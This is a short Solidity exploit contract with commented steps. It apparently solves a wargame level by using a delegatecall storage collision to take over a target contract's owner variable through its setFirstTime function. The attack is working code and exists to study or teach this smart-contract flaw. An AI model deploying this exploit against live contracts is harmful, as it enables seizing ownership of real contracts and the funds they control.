// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
  address public rand;
  address public rand2;
  address public owner;
  uint storedTime;

  function setTime(uint256) public {
    owner = msg.sender;
  }
}


// Deploy attack contract --> get address ("0x2A3d274Fd7C09db8f74EA7D9DabfdFc9b9c8D4d5")

// Call setFirstTime to make attack contract the library
    // await contract.setFirstTime("0x2A3d274Fd7C09db8f74EA7D9DabfdFc9b9c8D4d5")

// Call setFirstTime to make delegate call 
    // await contract.setFirstTime(12345)
